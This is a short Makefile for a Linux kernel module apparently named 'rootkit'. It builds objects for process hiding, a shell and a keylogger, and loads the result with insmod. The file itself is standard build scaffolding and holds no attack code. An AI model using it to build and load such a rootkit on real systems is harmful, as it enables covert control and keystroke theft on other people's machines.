MODULENAME=rootkit

# obj-m is a list of what kernel modules to build.  The .o and other
# objects will be automatically built from the corresponding .c file -
# no need to list the source files explicitly.
obj-m := $(MODULENAME).o
$(MODULENAME)-objs := src/proc.o src/hide.o src/rootkit.o src/shell.o \
                      src/keylogger.o 

# KDIR is the location of the kernel source.  The current standard is
# to link to the associated source tree from the directory containing
# the compiled modules.
KDIR  := /lib/modules/$(shell uname -r)/build

# PWD is the current working directory and the location of our module
# source files.
PWD   := $(shell pwd)

# default is the default make target.  The rule here says to run make
# with a working directory of the directory containing the kernel
# source and compile only the modules in the PWD (local) directory.
default:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

install:
	sudo insmod $(MODULENAME).ko

uninstall:
	sudo rmmod $(MODULENAME)

# Clean up the working directory from temporary files created when 
# the kernel module is compiled.
clean:
	rm -f Module.symvers
	rm -f modules.order
	rm -rf .tmp_versions
	find . -name '*.ko' | xargs rm -f
	find . -name '*.cmd' | xargs rm -f
	find . -name '*.mod.c' | xargs rm -f
	find . -name '*.mod.o' | xargs rm -f
	find . -name '*.o' | xargs rm -f